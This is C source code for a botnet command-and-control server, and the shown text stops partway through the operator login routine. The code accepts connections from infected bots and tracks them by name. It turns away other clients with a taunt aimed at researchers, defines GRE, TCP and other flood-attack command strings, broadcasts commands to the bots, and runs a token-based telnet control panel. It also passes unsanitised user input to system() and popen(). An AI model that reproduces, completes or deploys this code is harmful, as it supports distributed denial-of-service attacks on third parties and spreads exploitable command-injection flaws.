
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#define botnamesize 40
#define attackstring1 "RU"
#define attackstring2 "TCP"
#define attackstring3 "GRE"
#define kill1 "KILLBOT"
#define kill2 "KT"
 
#define MAXFDS 1000000 // No way we actually reach this amount. Ever.
#define threadss 100

static char msggg[2048];
void *removestr(char *buf,const char *rev)
{
  buf=strstr(buf,rev);
  memmove(buf,buf+strlen(rev),1+strlen(buf+strlen(rev)));
}

char *breakl(char *string)
{
	FILE *chk;
  char outp[1024];
  memset(outp,0,sizeof outp);
  char lck[512];
 strcpy(lck,string);
 chk = popen(lck, "r");
 fgets(outp, sizeof(outp), chk);
 pclose(chk);
 char *lol = outp;
 
 return lol;
 memset(outp,0,sizeof outp);
}

void *failed(int fd)
{
	char den[512];
	sprintf(den,"\x1b[1;37myou dont have priv to access this cmd.\r\n");
	if(send(fd, den, strlen(den), MSG_NOSIGNAL) == -1) return 0;
}


char decoded_data[1024], encoded_data[1024];
char encodes[] = { 
		'a', 'u', 'w', 'A', 'd', 'e', 'F', 'H', 'i', 'o', 'n', 'G', 'm', 'I', 'K', 'J',
		'Y', 'B', 'v', 'c', 'x', 'g', 'y', 'h', 'P', 'p', 'q', 'Q', 'W', 'R', 'L', 'S', 
		'C', 't', 'b', 's', 'E', '2', '1', 'N', 'O', 'j', 'k', 'l', 'V', '0', 'X', 'Z', 
		'3', '4', 'D', '7', '5', 'f', 'z', 'r', '8', '6', 'M', 'U', '9', 'T', '#', '?',
		'^', '&', '=', '(', '+', ')', '%'
	};

	char decodes[] = { 
		'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
		'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
		'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
		'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '.', ' ',
		'/', '|', '-', '&', ';', ':', '>'
	};
void decode(char *str)
{
	char decoded[512];
	int x = 0, i = 0, c;

	memset(decoded, 0, sizeof(decoded));
	while (x < strlen(str))
	{
		for (c = 0; c <= sizeof(encodes); c++)
		{
			if(str[x] == encodes[c])
			{
					decoded_data[i] = decodes[c];
				i++;
			}
		}
		x++;
	}

	return;
}

void encode(char *str)
{
	char encoded[512];
	int x = 0, i = 0, c;

	memset(encoded, 0, sizeof(encoded));
	while (x < strlen(str))
	{
		for (c = 0; c <= sizeof(decodes); c++)
		{
			if(str[x] == decodes[c])
			{
					encoded_data[i] = encodes[c];
				i++;
			}
		}
		x++;
	}

	return;
}
struct iplogger{
    int socket;
    char ipi[100];
};
struct clientdata_t{
        uint32_t ip;
		char connected;
} clients[MAXFDS];

struct botname{
    char joinname[512];
} botname[MAXFDS];

struct name{
char narray[512];
int jj;
};
static struct name arra[botnamesize];

struct telnetdata_t {
        int connected;
		char user[100];
		int admin;
} managements[MAXFDS];

struct account{
char id[200];
char password[200];
char priv[100];
char date[100];
};
static struct account accounts[20]; //max users set

static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str) // Remove whitespace from a string and properly null-terminate it.
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{ 
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        s = fcntl(sfd, F_SETFL, O_NONBLOCK); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
        hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
        hints.ai_flags = AI_PASSIVE;     /* All interfaces */
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender, char *bottt, int maxb)
{
        int i;
		int d=0;
        for(i = 0; i < MAXFDS; i++)
        {	
	            if(strlen(bottt) > 1)
				{
			    if(clients[i].connected)
				{
                if(i == us || (!clients[i].connected && managements[i].connected) || msg == "pingloli") continue;
				if(!strcmp(botname[i].joinname,bottt))
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
				}
				}
				else{
				if(clients[i].connected)
				{
                if(i == us || (!clients[i].connected && managements[i].connected) || msg == "pingloli") continue;
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
				d++;
				if(d >= maxb)
					break;
				}
				}
		
        }
		
}
 
void *epollEventLoop(void *useless) // the big loop used to control each bot asynchronously. Many threads of this get spawned.
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len); // accept a connection from a bot.
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
										
                                        char binyname[200];
										memset(binyname,0,sizeof binyname);
                                        fdgets(binyname, sizeof binyname,infd);
										
										if(strlen(binyname) > 199)
										sprintf(binyname,"fftt:");
									
										if(strstr(binyname,"fftt:"))
										{
                                                trim(binyname);
												removestr(binyname,"fftt:");
												memcpy(botname[infd].joinname,binyname, sizeof binyname);
												int g;
												for(g=0;g<botnamesize;g++)
												{
												if(!strcmp(arra[g].narray,binyname)){usleep(40000); break;}
												if(strlen(arra[g].narray) <= 0)
												{
												memcpy(arra[g].narray,binyname, sizeof binyname);
												break;
												}
												}
										}
										else{
											send(infd,"fuck off researcher!!\r\n",23,MSG_NOSIGNAL);
											close(infd);
										}
										
                                        char ip[100];
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
										sprintf(ip,"%d.%d.%d.%d",clients[infd].ip & 255, clients[infd].ip >> 8 & 255, clients[infd].ip >> 16 & 255, clients[infd].ip >> 24 & 255);
										printf("\x1b[1;37m<\x1b[1;32mDevice Connected\x1b[1;37m>\n\x1b[1;35mip\x1b[1;37m: %s\n\x1b[1;35mname\x1b[1;37m: %s\n",ip, botname[infd].joinname);
 
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) // check for duplicate clients by seeing if any have the same IP as the one connecting
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
 
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {
                                                close(ipIndex);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
											
												 if(strlen(buf)>=1)
												printf("\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] %s\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        char ip[200];
									sprintf(ip,"%d.%d.%d.%d",clients[thefd].ip & 255, clients[thefd].ip >> 8 & 255, clients[thefd].ip >> 16 & 255, clients[thefd].ip >> 24 & 255);
										printf("\x1b[1;37m<\x1b[1;31mDevice Disconnected\x1b[1;37m>\n\x1b[1;35mip\x1b[1;37m: %s\n\x1b[1;35mname\x1b[1;37m: %s\n",ip, botname[thefd].joinname);
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int clientsConnected() // counts the number of bots connected by looping over every possible file descriptor and checking if it's connected or not
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
unsigned int joinn()
{
	int i, f, g;
	
	char add[MAXFDS];

    for(g=0;g<botnamesize;g++)
	{
		arra[g].jj=0;
	}
	
   for(i=0;i<MAXFDS;i++)
   {
    for(f=0;f<botnamesize;f++){
	if(strcmp(botname[i].joinname,arra[f].narray) == 0 && clients[i].connected == 1)
	{
	arra[f].jj++;
	}
	}
	
   }
 
}
void *titleWriter(void *sock) // just an informational banner
{
        // this LOOKS vulnerable, but it's actually not.
        // there's no way we can have 2000 digits' worth of clients/bots connected to overflow that char array
        int thefd = *(int*)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0;Bots connected: %d | Clients connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(2);
        }
}
 
void *botshow(int thefd)
{
	    int i;
		int t=1;
		char sb[botnamesize][1024];
		char total[512];
		char lines[200];
		sprintf(lines,"\x1b[1;35m[\x1b[1;37m+\x1b[1;35m]---------------------[\x1b[1;37m+\x1b[1;35m]\r\n");
		if(send(thefd, lines, strlen(lines), MSG_NOSIGNAL) == -1) return;
		
	    for(i=0;i<botnamesize;i++)
		{
		if(arra[i].jj <= 0)
		{
		memset(arra[i].narray,0,sizeof(arra[i].narray));
		}
		if(strlen(arra[i].narray)>=1)
		{
		sprintf(sb[i],"\x1b[1;37m%s\x1b[1;31m: \x1b[1;35m[\x1b[1;37m%d\x1b[1;35m]\r\n",arra[i].narray,arra[i].jj);
	    if(send(thefd, sb[i], strlen(sb[i]), MSG_NOSIGNAL) == -1) return;
		memset(sb[i],0,sizeof sb[i]);
		}
		usleep(1500);
		}

		sprintf(total,"\x1b[1;32mTOTAL\x1b[1;31m: \x1b[1;35m[\x1b[1;37m%d\x1b[1;35m]\r\n",clientsConnected());
	    if(send(thefd, total, strlen(total), MSG_NOSIGNAL) == -1) return;
		if(send(thefd, lines, strlen(lines), MSG_NOSIGNAL) == -1) return;
}
 
int Search_in_File(char *filen, char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=-1;
    char temp[1024]; 

    if((fp = fopen(filen, "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 1024, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 
void *loadingscreenl(int thefd)
{
        int i;
        char gayi[1024];
		char credsload[21][1024];
    strcpy(credsload[0],"\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37musername\x1b[1;31m] \x1b[1;31m[\x1b[1;37m00%\x1b[1;31m] [                     ]\x1b[0m");
   strcpy(credsload[1], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37musername\x1b[1;31m] \x1b[1;31m[\x1b[1;37m05%\x1b[1;31m] [\x1b[1;37m#                    \x1b[1;31m]\x1b[0m");
   strcpy(credsload[2], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37musername\x1b[1;31m] \x1b[1;31m[\x1b[1;37m10%\x1b[1;31m] [\x1b[1;37m##                   \x1b[1;31m]\x1b[0m");
   strcpy(credsload[3], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37musername\x1b[1;31m] \x1b[1;31m[\x1b[1;37m15%\x1b[1;31m] [\x1b[1;37m###                  \x1b[1;31m]\x1b[0m");
   strcpy(credsload[4], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37musername\x1b[1;31m] \x1b[1;31m[\x1b[1;37m20%\x1b[1;31m] [\x1b[1;37m####                 \x1b[1;31m]\x1b[0m");
   strcpy(credsload[5], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37musername\x1b[1;31m] \x1b[1;31m[\x1b[1;37m25%\x1b[1;31m] [\x1b[1;37m#####                \x1b[1;31m]\x1b[0m");
   strcpy(credsload[6], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37musername\x1b[1;31m] \x1b[1;31m[\x1b[1;37m30%\x1b[1;31m] [\x1b[1;37m######               \x1b[1;31m]\x1b[0m");
   strcpy(credsload[7], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37musername\x1b[1;31m] \x1b[1;31m[\x1b[1;37m35%\x1b[1;31m] [\x1b[1;37m#######              \x1b[1;31m]\x1b[0m");
   strcpy(credsload[8], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37musername\x1b[1;31m] \x1b[1;31m[\x1b[1;37m40%\x1b[1;31m] [\x1b[1;37m########             \x1b[1;31m]\x1b[0m");
   strcpy(credsload[9], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37musername\x1b[1;31m] \x1b[1;31m[\x1b[1;37m45%\x1b[1;31m] [\x1b[1;37m#########            \x1b[1;31m]\x1b[0m");
   strcpy(credsload[10], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37musername\x1b[1;31m] \x1b[1;31m[\x1b[1;37m50%\x1b[1;31m] [\x1b[1;37m##########           \x1b[1;31m]\x1b[0m");
   strcpy(credsload[11], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mpassword\x1b[1;31m] \x1b[1;31m[\x1b[1;37m55%\x1b[1;31m] [\x1b[1;37m###########          \x1b[1;31m]\x1b[0m");
   strcpy(credsload[12], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mpassword\x1b[1;31m] \x1b[1;31m[\x1b[1;37m60%\x1b[1;31m] [\x1b[1;37m############         \x1b[1;31m]\x1b[0m");
   strcpy(credsload[13], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mpassword\x1b[1;31m] \x1b[1;31m[\x1b[1;37m65%\x1b[1;31m] [\x1b[1;37m#############        \x1b[1;31m]\x1b[0m");
   strcpy(credsload[14], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mpassword\x1b[1;31m] \x1b[1;31m[\x1b[1;37m70%\x1b[1;31m] [\x1b[1;37m##############       \x1b[1;31m]\x1b[0m");
   strcpy(credsload[15], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mpassword\x1b[1;31m] \x1b[1;31m[\x1b[1;37m75%\x1b[1;31m] [\x1b[1;37m###############      \x1b[1;31m]\x1b[0m");
   strcpy(credsload[16], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mpassword\x1b[1;31m] \x1b[1;31m[\x1b[1;37m80%\x1b[1;31m] [\x1b[1;37m################     \x1b[1;31m]\x1b[0m");
   strcpy(credsload[17], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mpassword\x1b[1;31m] \x1b[1;31m[\x1b[1;37m85%\x1b[1;31m] [\x1b[1;37m#################    \x1b[1;31m]\x1b[0m");
   strcpy(credsload[18], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mpassword\x1b[1;31m] \x1b[1;31m[\x1b[1;37m90%\x1b[1;31m] [\x1b[1;37m###################  \x1b[1;31m]\x1b[0m");
   strcpy(credsload[19], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mpassword\x1b[1;31m] \x1b[1;31m[\x1b[1;37m95%\x1b[1;31m] [\x1b[1;37m#################### \x1b[1;31m]\x1b[0m");
   strcpy(credsload[20], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mpassword\x1b[1;31m] \x1b[1;31m[\x1b[1;37m100%\x1b[1;31m] [\x1b[1;37m#####################\x1b[1;31m]\x1b[0m");
        for(i=0; i<21; i++){
        sprintf(gayi,"\r%s",credsload[i]);
	    if(send(thefd, gayi, strlen(gayi), MSG_NOSIGNAL) == -1) return;
	    usleep(200000);
        fflush(stdout);
        }
}

void *loadingscreent(int thefd)
{
	int ii;
        char gayii[1024];
	 char tokenload[21][1024];
    strcpy(tokenload[0],"\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m00%\x1b[1;31m] [                     ]");
   strcpy(tokenload[1], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m05%\x1b[1;31m] [\x1b[1;37m#                    \x1b[1;31m]");
   strcpy(tokenload[2], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m10%\x1b[1;31m] [\x1b[1;37m##                   \x1b[1;31m]");
   strcpy(tokenload[3], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m15%\x1b[1;31m] [\x1b[1;37m###                  \x1b[1;31m]");
   strcpy(tokenload[4], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m20%\x1b[1;31m] [\x1b[1;37m####                 \x1b[1;31m]");
   strcpy(tokenload[5], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m25%\x1b[1;31m] [\x1b[1;37m#####                \x1b[1;31m]");
   strcpy(tokenload[6], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m30%\x1b[1;31m] [\x1b[1;37m######               \x1b[1;31m]");
   strcpy(tokenload[7], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m35%\x1b[1;31m] [\x1b[1;37m#######              \x1b[1;31m]");
   strcpy(tokenload[8], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m40%\x1b[1;31m] [\x1b[1;37m########             \x1b[1;31m]");
   strcpy(tokenload[9], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m45%\x1b[1;31m] [\x1b[1;37m#########            \x1b[1;31m]");
   strcpy(tokenload[10], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m50%\x1b[1;31m] [\x1b[1;37m##########           \x1b[1;31m]");
   strcpy(tokenload[11], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m55%\x1b[1;31m] [\x1b[1;37m###########          \x1b[1;31m]");
   strcpy(tokenload[12], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m60%\x1b[1;31m] [\x1b[1;37m############         \x1b[1;31m]");
   strcpy(tokenload[13], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m65%\x1b[1;31m] [\x1b[1;37m#############        \x1b[1;31m]");
   strcpy(tokenload[14], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m70%\x1b[1;31m] [\x1b[1;37m##############       \x1b[1;31m]");
   strcpy(tokenload[15], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m75%\x1b[1;31m] [\x1b[1;37m###############      \x1b[1;31m]");
   strcpy(tokenload[16], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m80%\x1b[1;31m] [\x1b[1;37m################     \x1b[1;31m]");
   strcpy(tokenload[17], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m85%\x1b[1;31m] [\x1b[1;37m#################    \x1b[1;31m]");
   strcpy(tokenload[18], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m90%\x1b[1;31m] [\x1b[1;37m###################  \x1b[1;31m]");
   strcpy(tokenload[19], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m95%\x1b[1;31m] [\x1b[1;37m#################### \x1b[1;31m]");
   strcpy(tokenload[20], "\x1b[1;37mchecking \x1b[1;31m[\x1b[1;37mtoken\x1b[1;31m] [\x1b[1;37m100%\x1b[1;31m] [\x1b[1;37m#####################\x1b[1;31m]");
        for(ii=0; ii<21; ii++){
        sprintf(gayii,"\r%s",tokenload[ii]);
	    if(send(thefd, gayii, strlen(gayii), MSG_NOSIGNAL) == -1) return;
	    usleep(200000);
        fflush(stdout);
        }
}

tokenadd(int thefd)
{
	            char buf[1024];
	            char tok[512];
				char systok[512];
				char pt[512];
				char tokk[100];
				char date[512];
		        char dateout[100];
				tokre:
				sprintf(pt,"\x1b[1;37mnew token: \x1b[1;37m");
                if(send(thefd, pt,strlen(pt),MSG_NOSIGNAL) == -1) return;
		        memset(buf,0,sizeof(buf));
		        if(fdgets(buf, sizeof(buf), thefd) < 1) return;
				trim(buf);
				if(strlen(buf) < 5)
				{
				char over[512];
				sprintf(over,"must be at least over 5 chars\r\n");
				if(send(thefd, over,strlen(over),MSG_NOSIGNAL) == -1) return;
				goto tokre;
				}
				strcpy(tokk,buf);
	    sprintf(date,"expire date? (d/m/yyyy): ");
		if(send(thefd, date,strlen(date),MSG_NOSIGNAL) == -1) return;
		memset(buf,0,sizeof(buf));
		if(fdgets(buf, sizeof(buf), thefd) < 1) return;
		trim(buf);
		strcpy(dateout,buf);
		
				sprintf(tok,"\x1b[1;37mnew token added successfully!!\r\n");
		    if(send(thefd, tok,strlen(tok),MSG_NOSIGNAL) == -1) return;
			sprintf(systok,"echo \"%s %s\" >> tokens.txt",tokk, dateout);
			system(systok);
			memset(buf,0,sizeof(buf));
}

void *datechecker(int thefd, char *user)
{
            char del[512];
			char sys[200];
			sprintf(sys,"sed '/\\<%s\\>/d' -i logins.txt",user);
			system(sys);
			sprintf(del,"\r\n\x1b[1;37myour account \x1b[1;31m[\x1b[1;37m%s\x1b[1;31m]\x1b[1;37m has expired now removing user!!!",user);
			send(thefd, del, strlen(del), MSG_NOSIGNAL);
}

void *telnetWorker(void *lang)
{
	    struct iplogger *loli = lang;
        int thefd = loli->socket;
		char ipl[100];
		strcpy(ipl,loli->ipi);;
        managesConnected++;
        pthread_t title;
        char buf[2048];
		char iffailedu[1024];
		char iffailedp[1024];
		char* nickstring;
		char usernamez[80];
		int find_line=-1;
		int j=0;
        memset(buf, 0, sizeof buf);
 
        int c;
		int scan;
        FILE *fp;
        fp=fopen("logins.txt", "r"); 
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++scan;
        }
        rewind(fp);

        char hentai[20][1024];
		sprintf(hentai[0],"\x1b[1;37m⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄\r\n");
		sprintf(hentai[1],"\x1b[1;37m⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿\r\n");
		sprintf(hentai[2],"\x1b[1;37m⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿\r\n");
		sprintf(hentai[3],"\x1b[1;37m⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿\r\n");
		sprintf(hentai[4],"\x1b[1;37m⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋\r\n");
		sprintf(hentai[5],"\x1b[1;37m⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀\r\n");
		sprintf(hentai[6],"\x1b[1;37m⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿\r\n");
		sprintf(hentai[7],"\x1b[1;37m⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟\r\n");
		sprintf(hentai[8],"\x1b[1;37m⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃\r\n");
		sprintf(hentai[9],"\x1b[1;37m⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃\r\n");
		sprintf(hentai[10],"\x1b[1;37m⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄\r\n");
		sprintf(hentai[11],"\x1b[1;37m⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄\r\n");
		sprintf(hentai[12],"\x1b[1;37m⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄\r\n");
		sprintf(hentai[13],"\x1b[1;37m⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠\r\n");
		sprintf(hentai[14],"\x1b[1;37m⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿\r\n\r\n");
		
		int h;
		for(h =0;h<15;h++)
		 if(send(thefd, hentai[h], strlen(hentai[h]), MSG_NOSIGNAL) == -1) goto end;

		char reg[512];
		sprintf(reg,"\x1b[1;37mLogin or Register?\x1b[1;31m: \x1b[1;37m");
		if(send(thefd, reg,strlen(reg),MSG_NOSIGNAL) == -1) goto end;
		memset(buf, 0, sizeof buf);
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end; /* no data, kill connection */
        trim(buf);
		if(!strcmp(buf,"login") || !strcmp(buf,"l"))
		{
		login:
		for(j=0;j<scan;j++) 
        {
            fscanf(fp, "%s %s %s %s", accounts[j].id, accounts[j].password, accounts[j].priv, accounts[j].date);
        }
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[1;37mUsername\x1b[1;31m: \x1b[1;37m",32,MSG_NOSIGNAL) == -1) goto end;
		memset(buf,0,sizeof(buf));
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
		if(strlen(buf)>2047)close(thefd);
        trim(buf);
		strcpy(iffailedu,buf);
		sprintf(usernamez, buf);
        nickstring = ("%s", buf);
		memset(buf,0,sizeof(buf));
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[1;37mPassword\x1b[1;31m: \x1b[0;30m",32,MSG_NOSIGNAL) == -1) goto end;
